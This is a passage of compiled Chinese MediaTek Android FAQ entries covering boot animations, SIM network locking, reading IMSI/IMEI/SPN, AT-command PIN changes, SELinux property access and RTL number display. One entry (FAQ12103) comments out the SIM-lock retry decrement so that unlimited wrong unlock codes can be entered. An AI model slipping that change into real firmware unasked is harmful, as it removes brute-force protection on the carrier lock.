            "([\\.\\:]  [%s)] +[/%s] *)([\\.\\:] ?[^%s\\.\\:\\s/] +[^\\.=&%%/] *$)",
            mValidCharRegex, mValidCharRegex, mValidCharRegex);

    // Helper function for exgular expression group replacing.
    private static final String replaceGroup(String regex, String source, int groupToReplace,
             String replacement) {
             return replaceGroup(regex, source, groupToReplace, 1, replacement);
    }

    // Helper function for exgular expression group replacing.
    private static final String replaceGroup(String regex, String source, int groupToReplace,
             int groupOccurrence, String replacement) {
             Matcher m = Pattern.compile(regex).matcher(source);
             for (int i = 0; i < groupOccurrence; i++) {
                      if (!m.find()) {
                               return source;
                      }
              }
             return new StringBuilder(source).replace(m.start(groupToReplace), m.end(groupToReplace),
                       replacement).toString();
    }

    @Override
    public UrlData getWebUrl(String urlStr, int start, int end) {
              Log.d("@M_" + TAG, "getWebUrl, " + urlStr + " start=" + start + " end=" + end);
              if (urlStr != null) {
                       /// Filter out invalid characters at the begin of the url
                       Pattern p1 = Pattern.compile(mBadFrontRemovingRegex);
                       Matcher m1 = p1.matcher(urlStr);
                       if (m1.find()) {
                                 urlStr = replaceGroup(mBadFrontRemovingRegex, urlStr, 1, "");
                                 start = end - urlStr.length();
                        }

                       /// Filter out invalid characters at the end of the url
                       Pattern p2 = Pattern.compile(mBadEndRemovingRegex);
                       Matcher m2 = p2.matcher(urlStr);
                       if (m2.find()) {
                                  urlStr = replaceGroup(mBadEndRemovingRegex, urlStr, 2, "");
                                  end = start + urlStr.length();
                        }
               }
               Log.d("@M_" + TAG, "getWebUrl, return: " + urlStr + " start=" + start + " end=" + end);
               return new UrlData(urlStr, start, end);
    }

    @Override
    public int getPatternType() {
               return PATTERN_CHINA;
    }
}
```

## [FAQ19188]  3G常用feature支持情况在log中查看方法

## [bootanimation]  [FAQ19211]  [Android5.1] 开机动画desc.txt描述文件分析

```text
1、desc.txt文件格式分析
desc.txt文件由若干行组成，每一行代表一种描述。下面以一个具体的例子为例，具体说明

480 640 20 
p   1   0    folder1 
p   2   20  folder2 
c   0   0    folder3 
c   1   0    folder4 

  1行用来描述开机动画在屏幕显示的大小及速度。具体为：开机动画的宽度为480个像素，高度为640个像素，显示频率为每秒20帧，即每帧显示1/20秒。
  下面的每一行代表一个片段，显示的时候会按照顺序从上到下依次显示。第1个字符为片段类型，有'c'和'p'两种，两者的区别后面会结合代码说明。
  2个数字为该片段重复显示的次数，如果为‘0’，表示会无限重复显示；第3个数字为两次显示之间的间隔，单位为第一行中定义的每帧显示的时间；第4个字符串为该片段所在的文件夹，一个片段可以由多个png图片组成，都存放在folder文件夹中。
“p 1 0 folder1”-------代表该片段显示1次，与下一个片段间隔0s，该片段的显示图片路径为bootanimation.zip/folder1。
“p 2 20 folder2”--------代表该片段显示2次，且两次之间显示的间隔为20*(1/20)=1s，与下一个片段间隔20*(1/20)=1s，该片段的显示图片路径为bootanimation.zip/folder2。
“c 0 0 folder3”-------代表该片段无限循环显示，且两次显示的间隔为0s，与下一个片段间隔0s，该片段的显示图路径为bootanimation.zip/folder3。
“c 1 10 folder4”--------代表该片段显示1次，显示后暂停10*(1/20)=0.5s，该片段的显示图路径为bootanimation.zip/folder4。


2、"p"片段和“c”片段的区别
  在早期Android版本中只有“p”片段，且movie()中的显示代码如下：
for (int i=0 ; i<pcount && !exitPending() ; i++) { 
  const Animation::Part& part(animation.parts[i] ); 
  const size_t fcount = part.frames.size(); 
  glBindTexture(GL_TEXTURE_2D, 0); 

  for (int r=0 ; !part.count || r<part.count ; r++) { 
       for (int j=0 ; j<fcount && !exitPending(); j++) { 
            const Animation::Frame& frame(part.frames[j] ); 
            ....... 

} 

  里面的主要参数和函数说吗如下：
pcount---显示片段的数量，比如上面的例子，pcount=4
p.count---该片段的重复显示次数。
fcount---该片段中png图片的数量
exitPending()---如果SurfaceFlinger服务通知bootanimation停止显示动画，则该函数返回值为true，否则为false。
  第一个for循环用于顺序显示所有片段，第二个for循环用于重复显示该片段，第三个for循环用于顺序显示该片段中所有的png图片。
  分析代码，可知：若exitPending()返回值为true，即SurfaceFlinger服务要求bootanimation停止显示动画，则不管当前显示到哪个片段或png图片，都会导致退出for循环，从而停止开机动画的显示。
  在Android5.1中，加入了“c”片段。对与以"c"标识的片段，即使exitPending()返回值为true，也会继续显示。
我们分析一下源码，首先看一下movie()中解析desc.txt的代码：

// Parse the description file 
for (;;) { 
...... 
if (sscanf(l, "%d %d %d %d", &width, &height, &fps, &flg) >= 3) { 
  animation.width = width; 
  animation.height = height; 
  animation.fps = fps; 
} 
else if (sscanf(l, " %c %d %d %s #%6s", &pathType, &count, &pause, path, color) >= 4) { 
  Animation::Part part; 
  part.playUntilComplete = pathType == 'c'; 
  part.count = count; 
  part.pause = pause; 
  part.path = path; 
  part.audioFile = NULL; 
  if (!parseColor(color, part.backgroundColor)) { 
        ALOGE("> invalid color '#%s'", color); 
        part.backgroundColor[0]  = 0.0f; 
        part.backgroundColor[1]  = 0.0f; 
        part.backgroundColor[2]  = 0.0f; 
  } 
  animation.parts.add(part); 
} 
  s = ++endl; 
} 
  可以看到，如果pathType==‘c’，part.playUntilComplete等于true，否则为false。接着，看一下显示代码：
for (size_t i=0 ; i<pcount ; i++) { 
  const Animation::Part& part(animation.parts[i] ); 
  const size_t fcount = part.frames.size(); 
  glBindTexture(GL_TEXTURE_2D, 0); 

  for (int r=0 ; !part.count || r<part.count ; r++) { 
        // Exit any non playuntil complete parts immediately 
        if(exitPending() && !part.playUntilComplete) 
              break; 
  ...... 

        for (size_t j=0 ; j<fcount && (!exitPending() || part.playUntilComplete) ; j++) { 
        ...... 
        checkExit(); 
  } 
  usleep(part.pause * ns2us(frameDuration)); 
  // For infinite parts, we've now played them at least once, so perhaps exit 
  if(exitPending() && !part.count) 
        break; 
  } 
  ...... 
} 
  可以看到，如果exitPending()返回值为true且part.playUntilComplete=false，则会break。即：当SurfaceFlinger服务要求bootanimation停止显示动画时，以‘p’标识的片段会停止，而以'c'标识的片段会继续显示。这就是两者之间的主要区别。
  这里有个问题：重复循环显示的'c'标识片段，会不受任何约束的一直显示下去，这显然是不合适的。
于是在第二个for循环体最后，有如下代码：

// For infinite parts, we've now played them at least once, so perhaps exit 
if(exitPending() && !part.count) 
  break; 
意思是，如果检测到SurfaceFlinger服务要求bootanimation停止显示，且该片段的显示次数为'0'，即重复循环显示，则会break停止显示。

  估计"c"标识的意思是continue，即：即使SurfaceFlinger要求bootanimation停止动画，bootanimation也不会立刻停止动画，它会等c标识片段都显示完毕后，再停止。
这样，我们可以利用'c'和'p'片段的区别，设计出更灵活的开关机动画。

[FAQ03051]  非运营商定制项目如何客制化自己的开关机动画、开关机铃声
```

## [锁网]  [FAQ17334]  [SIM_ME_LOCK] MCCMNC锁卡失败

```text
如果锁卡的目标合法MCC-MNC是:738002,可是锁卡后目标卡(即738002的卡)进不到待机界面。(提示:Enter NP/SP等等Code，输入正确密码后才能进入)。但是使用中国移动(46000)或是中国联通(46001)等MCC-MNC是5位的卡测试，锁网功能正常。 

这个现象是这些特殊卡的EF_AD中没有指定MNC的长度造成的。

  
[SOLUTION] 
MCC-MNC 长度 = mcc_length + mnc_length;
mcc_length : 固定是3。
Mnc_length : 与SIM卡有关，2 或 3，初始值为0，mnc_length 是在SIM卡初始化时从 EF_AD 第四个字节获取，有效值是2 或 3;

当 EF_AD 第四个字节无效时，mnc_length = 0；匹配失败，导致锁卡失败。

所以，当SIM 卡 EF_AD 第四个字节无效，没有写 mnc_length 时，确保锁卡MCC-MNC为5位或6位都有效的方法：

确保 SML_MNC_LENGTH_NEST 的值为 1，并修改 sml_GetCode 为如下：

kal_uint8 sml_GetCode( sml_cat_enum cat, 

kal_uint8 * imsi, 

kal_uint8 * gid1, 

kal_uint8 * gid2, 

kal_uint8 sim_mnc_len,

kal_uint8 * pdata,

kal_uint8 * code) 
{ 
     kal_uint8 mnc_len=0;

     if (SML_MNC_LENGTH_NEST == 1)     //Get mnc length from SIM 
     {
         if ((sim_mnc_len == 2) || (sim_mnc_len == 3)) 
         { 
            mnc_len = sim_mnc_len; 
         } 
         else
         { 
            if(((*(pdata+2)) & 0x0F) == 0x0F) 
            { 
                 mnc_len = 2; 
            } 
            else
            { 
                 mnc_len = 3; 
            } 
         } 
     } 
     else      //Get mnc length from NVRAM 
     { 
         if(((*(pdata+2)) & 0x0F) == 0x0F) 
         { 
             mnc_len = 2; 
         } 
         else
         { 
             mnc_len = 3; 
         } 
     } 
     return sml_Catcode(cat, imsi, gid1, gid2, mnc_len, code); . 
} 
```

## [FAQ12867]  [SIM] 如何读取SIM卡的EFspn

```text
获取SPN值有两种方法：
第一种：通过保存开机时上报的spn值。
因为MMI operator string 显示的时候会用到，所以默认已经会在开机时报给MMI 了
PRT_MSG_ID_MMI_CPHS_MMI_INFO_IND
srv_nw_name_cphs_mmi_info_ind_hdlr
srv_nw_name_cphs_mmi_info_ind_hdlr_int
msg->spn 里有带SPN 的值，直接保存这个值。
第二种：用SIM access 的API 去获得SPN。
1）MMI_BOOL srv_sim_get_file_info(
        U16 file_index,
        U8 *file_path,
        mmi_sim_enum sim_id,
        SrvSimCallbackFunc callback,
        void *user_data)
获取SIM file 大小等信息 ，file_index ：FILE_SPN_IDX  callback 函数 是获得了SIM file info之后会被call 到
参数 的structure(srv_sim_file_info_struct *)param->data
然后实现call back 函数：主要去做的是 根据获得了file size ，再去读具体的SIM file 的内容。
2）MMI_BOOL srv_sim_read_binary(
        U16 file_index,
        U8 *file_path,
        U16 offset,
        U16 length,
        mmi_sim_enum sim_id,
        SrvSimCallbackFunc callback,
        void *user_data)
调用这个去读SIM file 的内容 ，其中file_index FILE_SPN_IDX   ，length ：用之前第一步获得的file size

注意：
srv_sim_read_record  ： 用于读取SIM file 类型是 linear fixed 或者 cyclic  的sim 文件 ，即 文件的存储内容是一条一条的record 的，每条record 大小一样。例如EFsms 存sms 的sim file
srv_sim_read_binary ：用于读取SIM file 类型是 transparent 的sim 文件即 文件的存储内容 没有record ，只是连续的一串data 。 像SPN就是transparent 的type
SIM file 的类型 ，及数据内容各个byte 的含义 都可以在Spec 里找到，可以在网上down到ETSI 51.011
```

## [锁网]  [FAQ10433]  [SEC] 修改SIM ME lock解锁码与IMEI号保持对应关系

```text
有运营商需求，SIM ME LOCK的解锁码由手机的IMEI根据一个算法动态计算而来.

默认SIM ME LOCK的解锁码是由modem 配置固定的，无法根据IMEI来动态设置modem的密码，那么这个部分就需要客制化。

建议客制化的做法如下:

Modem 端原始密码继续按照文档doc进行锁网配置；
AP 端用户密码需要用IMEI 经过一个算法计算后得到一个新密码；
AP 端用户输入这个新密码后，再通过算法解密，判断密码是否有效，有效则用原始密码发给Modem进行解锁；
这种方案相当于AP 端解锁密码界面处理多了一步算法处理。

AP端处理密码的部分:
1. 这个和IMEI 有关系的解密部分，还是要贵司自行完成
a. 如何获取对应卡槽的IMEI，请参考FAQ02913 如何获取IMEI号

解密的code可以添加在如下位置

L 版本:

alps\frameworks\base\packages\keyguard\src\com\mediatek\keyguard\telephony\KeyguardSimPinPukMeView.java

//CheckSimMe.run()
mResult = ITelephonyEx.Stub.asInterface(ServiceManager.getService("phoneEx"))

.supplyNetworkDepersonalization(subId, mPasswd);

//其中的mPasswd 就是从界面上输入的数字

KK版本alps\frameworks\base\policy\src\com\android\internal\policy\impl\keyguard\KeyguardSimPinPukView.java 
//CheckSimMe.run()
mResult = ITelephonyEx.Stub.asInterface(ServiceManager.checkService("phoneEx")).supplyNetworkDepersonalization(mPasswd, mSimId);

//其中的mPasswd 就是从界面上输入的数字

解密的code 请在执行supplyNetworkDepersonalization() 之前进行

解密完之后确认密码正确，则将原始密码作为参数mPasswd 传入

另外对输入的数字有一个判断函数，目前只允许输入8个，而贵司输入IMEI计算后的密码如果超过8个数字则不符合spec要求，
请参考FAQ12171 [SEC] 锁网密码允许输入超过8个数字
```

## [AT]  [FAQ03693]  [AT Command]  [SIM] 如何用AT命令修改PIN

```text
如何用AT命令修改PIN

1. 请用AT+CPWD修改PIN,要在enable PIN的情况下，才能修改PIN，所以要先用AT+CLCK enable PIN。
参考以下步骤：
AT+CLCK="SC",1,"1234"                //enable PIN，此操作需要PIN
AT+CPWD="SC","1234","1111"       //修改PIN

2. 如果需要disable PIN，那么需要先下AT+CPIN verify，再进行disable。
参考如下步骤：
AT+CPIN="1111"
AT+CLCK="SC",0,"1111"                     //disable PIN
```

## [prop]  [FAQ19185]  android N 后无法读取个别 system property 说明

```text
某个system property 明明已经写入成功, 但是通过adb 无法读取到, 或者某个程序无法读取到.

其原因是android N 版本上, Google 对System Property 的流程做了大的调整, 其中最大的影响就是对读取 system property 也做了限制, 统一由SELinux 来操作控制. 根据SELinux Context 分割成多个互不关联的buffer trie/binary tree structure. 这些buffer 统一采用mmap 的搭建, 而对应mmap 的file 都放在 /dev/__properties__. 通常SELinux Context 都是按照system property 前缀划分的, 可以审查property_contexts 来查看. 
因为system property 太多, Google 并且这样的改动, 导致原本get prop 没有权限限制而都有了权限限制, 为了使得影响尽可能减小, Google 又对原本的system property 进行了划分. 除ctl.* 的控制属性之外, 常见的有:

Google 默认:

property_type : 是property 最基本的attribute, 定义时都必须包含.

core_property_type: 系统基本property, 每个进程都可以访问的property.  //domain.te get_prop(domain, core_property_type)

log_property_type: Log 类型的property, 每个进程都可以访问的property. //get_prop(domain, log_property_type)

MTK 新增:

mtk_core_property_type: mtk 系统基本property, 每个进程都可以访问的property. //get_prop(domain, mtk_core_property_type)

特别注意的是, get prop 访问失败时, 不会有SELinux 提示, 因为Google 在domain.te 里面添

dontaudit domain property_type:file audit_access;

为了大家好统一撰写SELinux Policy, Google 定义了两个macro.  即get_prop 和 set_prop 


[SOLUTION] 

如果你的system property 不涉及什么私密信息, 你就直接在定义你的prop 的SELinux type 时, 加一个core_property_type, 这样每个进程都可以看到. 如果比较私密, 那么对应要查看的process , 则要使用get_prop 宏添加SELinux 权限.

然后最后提醒一点, get prop 读取不出来, 没有任何的异常的SELinux 打印.
```

## [锁网]  [FAQ02917]  [SEC] SIM ME LOCK(锁网/锁卡)功能介绍和使用

```text
做SIM-ME Lock 相关feature开发，请先参考DCC文档《SIM-ME Lock For Customer》 和《SIM_ME_Lock宝典》。
```

## [锁网]  [FAQ12103]  [SEC] AP端怎样实现锁卡功能可无限次输入错误密码

```text
实现这个功能需要在AP和modem同时做修改。
一、Modem端:
将sml_verify()函数中的如下代码注释掉之后make new重新编译：
meta->retry_count--;

二、AP 端:
除了modem端的修改，还需要在AP的UI显示做修改。

L 版本上:
Path: alps\frameworks\base\packages\keyguard\src\com\android\keyguard\KeyguardUpdateMonitor.java
public void minusSimMeLeftRetryCountOfPhoneId(int phoneId) {
    int simMeRetryCount = mSimMeLeftRetryCount.get(phoneId) ;
    if (simMeRetryCount > 0) {
        //mSimMeLeftRetryCount.put(phoneId, simMeRetryCount - 1);  //去掉减1动作， 改为:
        mSimMeLeftRetryCount.put(phoneId, simMeRetryCount);
    }
}

KK版本:
收到卡被SIM ME LOCK住时才会去获取对应Category的retry count, 并记录在数组mSimMeLeftRetryCount中。
每输入一次错误密码，都会调用minusSimMeLeftRetryCount()来减少次数。
修改如下：
Path: alps\frameworks\base\packages\keyguard\src\com\android\keyguard\KeyguardUpdateMonitor.java
public void minusSimMeLeftRetryCount(int simId) {
    if (mSimMeLeftRetryCount[simId]  > 0 ) {
      //注释 mSimMeLeftRetryCount[simId] --;
    }
}
关于界面上次数的显示如果也要同步修改
请参考FAQ10495 [SEC] 如何在AP端修改SIM ME LOCK输入密码次数
```

## [锁网]  [FAQ19165]  [SEC] 初次进入PIN/PUK校验界面显示PIN/PUK Retry剩余次数

```text
需要修改文件位于
/frameworks/base/packages/Keyguard/src/com/mediatek/keyguard/Telephony/KeyguardSimPinPukMeView.java
修改代码如下：
public void resetState(boolean forceReload) {
    ......
    if (simState == IccCardConstants.State.PIN_REQUIRED) {
        msg = rez.getString(R.string.kg_sim_pin_instructions_multi, displayName);

        //for PIN
        msg += "Remaining Attemps: " + getRetryPinString(mPhoneId);
        mUnlockEnterState = STATE_ENTER_PIN;
    } else if (simState == IccCardConstants.State.PUK_REQUIRED) {
        msg = rez.getString(R.string.kg_puk_enter_puk_hint_multi, displayName);

        //for PUK
        msg += "Remaining Attemps: " + getRetryPuk(mPhoneId);
        mUnlockEnterState = STATE_ENTER_PUK;
    }
    ......
}
```

## [FAQ02916]  [Common] 如何判断sim卡是否有插入

```text
M版本：
PhoneInterfaceManager.java 里面有提供 hasIccCardUsingSlotId 方法；

使用方法如下：
import com.android.internal.telephony.ITelephony;

final ITelephony iTel = ITelephony.Stub.asInterface(ServiceManager.getService(“phone”));
boolean isSimInsert = false;
try {
    if (iTel != null) {
        isSimInsert = iTel.hasIccCardUsingSlotId(slotId);
    }
} catch (RemoteException e) {
    e.printStackTrace();
    isSimInsert = false;
}

L版本：
PhoneInterfaceManagerEx.java里面有提供hasIccCard方法；
使用方法如下：
import com.mediatek.internal.telephony.ITelephonyEx;

final ITelephonyEx phoneEx=ITelephony.Stub.asInterace(ServiceManager.checkSetvice(“phoneEx”));
if (phoneEx!=null) {
    // slotId: PhoneConstants.SIM_ID_1, PhoneConstants.SIM_ID_2
    long subId=getSubIdBySlot(slotId);
    boolean isInsert= phoneEx. hasIccCard (subId);
}

KK版本：
PhoneInterfaceManagerEx.java里面有提供hasIccCard方法；
使用方法如下：
import com.mediatek.common.telephony.ITelephonyEx;

final ITelephonyEx phoneEx=ITelephony.Stub.asInterace(ServiceManager.checkSetvice("phoneEx"));
if(phoneEx!=null){
    boolean isInsert= phoneEx. hasIccCard (slotId);
}

KK之前的版本：
PhoneInterfaceManager.java里面有提供isSimInsert方法；
使用方法如下：
import com.android.internal.telephony.ITelephony;

final ITelephony phone = ITelephony.Stub.asInterace(ServiceManager.checkSetvice("phone"));
if (phone != null) {
    boolean isInsert=phone.isSimInsert(slotId);
}
```

## [FAQ02914]  [Common] 如何获取IMSI号

```text
IMSI（International Mobile SubscriberIdentification Number）国际移动用户识别码
是区别移动用户的标志，储存在SIM卡中。
请参看 TelephonyManagerEx.java 里面的方法getSubscriberId().
例如：
L版本、以及以后版本：
TelephonyManagerEx mTelephonyMgr = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE_EX);
if (mTelephonyMgr != null) {
    String sim1IMSI = mTelephonyMgr.getSubscriberId(PhoneConstants.SIM_ID_1);
    String sim2IMSI = mTelephonyMgr.getSubscriberId(PhoneConstants.SIM_ID_2);
}

KK及之前版本：
String imsi = "";
TelephonyManagerEx mTelephonyMgr = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE_EX);
if (mTelephonyMgr != null) {
    String sim1IMSI = mTelephonyMgr.getSubscriberId(PhoneConstants.GEMINI_SIM_1);
    String sim2IMSI = mTelephonyMgr.getSubscriberId(PhoneConstants.GEMINI_SIM_2);
}
```

## [FAQ02913]  [Common] 如何获取IMEI号和MEID号

```text
IMEI号是GSM的概念，CDMA对应的是MEID号。

IMEI（International Mobile Equipment Identity）是国际移动设备身份码，目前GSM/WCDMA/LTE手机终端需要使用IMEI号码。在单卡工程中一个手机对应一个IMEI号；双卡工程中一张卡对应一个IMEI号，双卡共有两个IMEI号。

MEID (Mobile Equipment Identifier) 移动设备识别码，是CDMA手机的唯一身份识别码。
通过GSMPhone对象来调用getDeviceId()函数，获取到的就是IMEI号。
通过CDMAPhone对象来调用getDeviceId()函数，获取到的就是MEID号。

一、如何获取IMEI号

M0.mp7/M0.mp9版本（包含C2K和非C2K项目）、

M0.mp1版本非C2K项目、

L版本非C2K项目上：

GSMPhone.java中的getDeviceId()

L上面已经没有GeminiPhone；

使用方法如下：
Phone mPhone1=PhoneFactory.getPhone(PhoneConstants.SIM_ID_1);
Phone mPhone2=PhoneFactory.getPhone(PhoneConstants.SIM_ID_2);

if (mPhone1 != null) {
    String imei_sim1 =  mPhone1.getDeviceId();
}

if (mPhone2 != null) {
    String imei_sim2 =  mPhone2.getDeviceId();
}

M0.mp1版本C2K项目、

L版本C2K项目上：

L版本C2K项目上，一张卡同时对应一个CDMAPhone和一个GSMPhone，要获取对应卡的IMEI号，需要先获取到对应的GSMPhone对象，具体可以通过下面的方法来获取：
SIM1-> CDMAPhone = PhoneFactory.getPhone(0).getNLtePhone()
SIM1-> GSMPhone = PhoneFactory.getPhone(0).getLtePhone()
SIM2->  CDMAPhone = PhoneFactory.getPhone(1).getNLtePhone()
SIM2->  GSMPhone = PhoneFactory.getPhone(1).getLtePhone()

获取到GSMPhone对象后，通过该对象来调用getDeviceId()函数。

KK版本上：
GSMPhone.java    中getDeviceId()
GeminiPhone.java 其中getDeviceIdGemini()已经没有了，而getDeviceId()获取的是default phone的IMEI；
所以直接使用GSMPhone.java中getDeviceId()方法； 

Demo code:
GeminiPhone mGeminiPhone;
String imei_sim1=mGeminiPhone.getPhonebyId(PhoneConstants.GEMINI_SIM_1).getDeviceId();
String imei_sim2=mGeminiPhone.getPhonebyId(PhoneConstants.GEMINI_SIM_2).getDeviceId();

KK之前的版本：
下面是获得IMEI号的接口和demo code

API：
GSMPhone.java     中getDeviceId()
GeminiPhone.java  中getDeviceId() 和 getDeviceIdGemini()

Demo code:
import com.android.internal.telephony.Phone;
import com.android.internal.telephony.gemini.GeminiPhone;
import com.android.internal.telephony.PhoneFactory;
Phone phone;
phone = PhoneFactory.getDefaultPhone();
String  imei=(GeminiPhone)phone.getDeviceId();
GeminiPhone mGeminiPhone;
String imei_sim1 = mGeminiPhone.getDeviceIdGemini(PhoneConstants.GEMINI_SIM_1);
String imei_sim2 = mGeminiPhone.getDeviceIdGemini(PhoneConstants.GEMINI_SIM_2);

二、如何获取MEID号

M0.mp7/M0.mp9版本C2K项目：

通过CDMAPhone.java的getDeviceId()函数来获取。

请在插入电信卡的情况下调用，避免插入非电信卡没有创建CDMAPhone对象，会获取不到。

M0.mp1版本C2K项目、

L版本C2K项目上：

参考上面的说明，要获取MEID号，需要先获取对应卡的CDMAPhone对象，具体可以通过下面的方法来获取：
SIM1-> CDMAPhone = PhoneFactory.getPhone(0).getNLtePhone()
SIM1-> GSMPhone = PhoneFactory.getPhone(0).getLtePhone()
SIM2->  CDMAPhone = PhoneFactory.getPhone(1).getNLtePhone()
SIM2->  GSMPhone = PhoneFactory.getPhone(1).getLtePhone()

获取到CDMAPhone对象后，通过该对象来调用getDeviceId()函数。

如果电信卡插在卡1上，则使用上面SIM1的方法来获取卡1的CDMAPhone对象。
如果电信卡插在卡2上，则使用上面 SIM2 的方式来获取卡2的CDMAPhone对象。

如果同时插入两张电信卡，由于同一时刻只支持一张电信卡，则只有主卡可以获取到MEID号，可以通过PhoneFactory.getDefaultPhone().getNLtePhone() 来获取主卡的CDMAPhone对象。
```

## [FAQ19109]  [Audio Framework]  SoundPool java 类的使用说明

```text
app 层在使用 soundpool java 类时，通常会用到以下几个方法：
SoundPool sp = new SoundPool(x,x,x); //new 一个实例
sp.load(x,x,x,x);//加载对应的音源
sp.play(x,x,x,x,x,x); //播放对应的音源
 
然而当上述方法调用之后，在 native 层其实会有一些 memory 被 native 的 soundpool 类所 cache 住
如果 app 在使用上述三个方法之后，不调用相关的释放 native 资源的方法
就会造成 native 的 memory leak.
 
所以 app 在使用完 soundpool 之后，一定要记得调用 soundpool 的 release 接口
sp.release();
release 接口调用的次数要等同于new soundpool 的次数，这样才不会造成内存泄漏
像其它 MediaPlayer, AudioTrack,ToneGenator java 类的使用也是一样的，在用完后必须调用其 release 接口
 
FAQ:
soundpool 在调用 release 之前是否需要调用 unload 接口去 unload 前面所 load 的资源呢?
==》答案是否定的，在 release 接口被调用的时候会统一做 unload 资源的动作，因此release 之前无须逐一去 unload 所加载的资源
```

## [sim]  [FAQ02911]  [Common] 如何判断是usim卡还是sim卡

```text
L版本、及以后版本：
参见PhoneInterfaceManagerEx.java中的getIccCardType()方法；

import com.mediatek.internal.telephony.ITelephonyEx;

final ITelephonyEx mTelEx = ITelephonyEx.Stub.asInterface(ServiceManager.getService("phoneEx"));
// slotId: PhoneConstants.SIM_ID_1, PhoneConstants.SIM_ID_2
long subId=getSubIdBySlot(slotId);
if (mTelEx != null) String Type = mTelEx.getIccCardType(subId);

KK版本：
参见PhoneInterfaceManagerEx.java中的getIccCardType()方法；

import com.mediatek.common.telephony.ITelephonyEx;
final ITelephonyEx mTelEx = ITelephonyEx.Stub.asInterface(ServiceManager.getService("phoneEx"));
//slotId: PhoneConstants.GEMINI_SIM_1, PhoneConstants.GEMINI_SIM_2
if (mTelEx != null) String Type = mTelEx.getIccCardType(slotId);

KK之前的版本：
PhoneInterfaceManager.java中API: getIccCardTypeGemini

import com.android.internal.telephony.ITelephony;
final ITelephony iTel = ITelephony.Stub.asInterface(ServiceManager.getService(Context.TELEPHONY_SERVICE));
try {
    if (FeatureOption.MTK_GEMINI_SUPPORT) {
    if ("USIM".equals(iTel.getIccCardTypeGemini(slotId))) {
        //do something
    } else {
    if ("USIM".equals(iTel.getIccCardType())) {
        //do something
    }
} catch (Exception e) {
     Log.d(TAG, "catched exception.");
     e.printStackTrace();
}
```

## [debug]  [FAQ18923]  [Audio framework]  开启开机安全校验后，首次开机铃声播放不全

```text
开启开机安全校验后，首次开机铃声播放不全，播到中途被截断掉
其原因是：
开启了开机安全校验后
首次开机安全校验完毕后
会重新启动 framework，此时会将 mediaserver 等一系列注册过的 service 都 kill 掉
再重新启动
因为音乐的播放需要依赖于 mediaserver
当 mediaserver 被 kill 时，铃声便会随着中止
 
此为正常现象，没有规避方法
```

## [sim]  [FAQ18327]  Android M 首次开机随sim卡自适应语言错误原因及修改方案

```text
Android M上默认不会随sim卡去自适应语言。
对于M上有些首次开机不是系统默认配置的语言问题，是因为安装了GMS包，M上虽然没有去自适应语言，但是有从sim卡的EF中去读取语言并保存起来（只是默认没有使用它去更新语言而已），GMS包中有使用这个保存的语言用它去更新语言，所以安装了GMS包后会自适应为EF文件中读取到的语言。 EF文件中读取到的语言一般是这个sim卡所属国家的语言，但有些坏的sim中EF文件存储的是其它国家的语言，所以自适应语言时也会自适应为其它国家的语言。

对于有GMS包的情况如果想修改成不随卡中EF文件自适应的情况，可如下修改：
packages/services/Telephony/src/com/android/phone/PhoneInterfaceManager.java
@Override
public String getLocaleFromDefaultSim() {
    return null;//直接return null
}

如果想修改Ｍ的默认设计希望能随sim卡自适应，但不根据EF文件读取的语言自适应（根据sim卡mcc自适应）可去参考　FAQ17975　Android M 首次开机不随sim卡自适应语言修改方案。
```

## [ota] 支持OTA升级及OTA升级的相应资料、OTA升级与FOTA的区别

```text
支持情况：目前MT6573/75/77都支持OTA升级
相关资料：有关OTA升级的参考资料请参考DMS的以下路径：
/3G Phone Data/Smart Phone/Software_Customer/Standard Package/MT6577 SW Doc Package/Application/OTA Update
客户端的代码请参考：alps/mediatek/source/packages/GoogleOta*三支文件

DM/fota和mota的区别：是两种软件版本升级的方式，只需采用其中之一即可。
fota: 是需要拿到三方RedBend的license，升级包的发布与管理是由运行商控制的，在实现过程中需要从运行商那申请开通DM（增强售后服务）功能，在升级过程中需要收费；
mota: 是敝司自行实现的一套升级方式，其中server端和客户端都已经实现，且免费提供给客户，是不需要三方介入。
```

## [RTL]  [FAQ09094]  RTL语言下电话号码显示问题

```text
1、一些复杂语言字符显示以及layout是从右向左的，比如阿拉伯语、波斯、乌尔都语、希伯来语。因此经常会遇到一些情况是，其他非RTL字符串(比如英文、数字等)在和这些语言字符组合时，当系统语言如果是RTL语言，那么非RTL字符串也会变成从右向左显示；还有就是一些ap，比如Phone、联系人等，在ap设置了一些属性之后电话号码会变成从右向左显示，例如：135 4567 4562 会变成4562 4567 135 如果要实现系统语言为阿拉伯语等RTL语言时，一些非RTL字串按照自己显示顺序(LTR)显示，可以按照如下方法修改,
(A)    如果这些字串是在string.xml中定义，可以把相关字串加上控制符使其从左向右显示，如下
<string name="lockpassword_pin_too_long"> RTL字串\u202D <xliff:g id="number" example="17">%d</xliff:g>\u202C RTL字串</string>

也可以使用 '\u202A ，'\u202C';

(B)    如果是在代码中动态生成可以新增如下函数，进行处理
///M: to fix number display order problem in Dialpad in Arabic/Hebrew/Urdu
private String numberLeftToRight(String origin) {
    return TextUtils.isEmpty(origin) ? origin : '\u202D' + origin + '\u202C';// 也可以使用'\u202A ，'\u202C';
}

例如：通话界面拨打一个没有姓名的电话，如果在AndroidManifest.xml(JB2及以后版本) 声明文件的<application>元素中，添加了   android:supportsRtl=true这个属  性，电话号码就会出现如下情况

解决方法就是修改CallCard.java(alps\packages\apps\Phone\src\com\android\phone)的函数如下红色部分

private void updateDisplayForPerson(CallerInfo info,int presentation,boolean isTemporary,Call call,Connection conn)
……
// Promote the phone number up to the "name" slot:
// displayName = number;
displayName = numberLeftToRight(number);

2、 对于RTL语言下TextView或者EditText“+18545784578”显示成“18545784578+”，这是google默认的问题，对比机也有类似的问题
目前没有比较好的解决方法，如果确实要修改，可以在TexView地方加上特殊处理，如下对“+86”号码的处理。

TextView.java  alps\frameworks\base\core\java\android\widget

private void setText(CharSequence text, BufferType type,
boolean notifyBefore, int oldlen) {
if (text == null) {
    text = "";
}

///add this code
Configuration con = mContext.getResources().getConfiguration();
String l = con.locale.getLanguage();
if(l.equals("ar")||l.equals("fa")||l.equals("iw")){///RTL language

Pattern pattern
= Pattern.compile(                      // sdd = space, dot, or dash
"(\\+[0-9] +[\\- \\.] *)?"        // +<digits><sdd>*
+ "(\\([0-9] +\\)[\\- \\.] *)?"   // (<digits>)<sdd>*
+ "([0-9]  [0-9\\- \\.] +[0-9] )"); // <digit><digit|sdd>+<digit>
Matcher matcher = pattern.matcher(text);
while(matcher.find()){
String subnumber = match.group(0);
int index = text.toString().indexOf(subnumber);
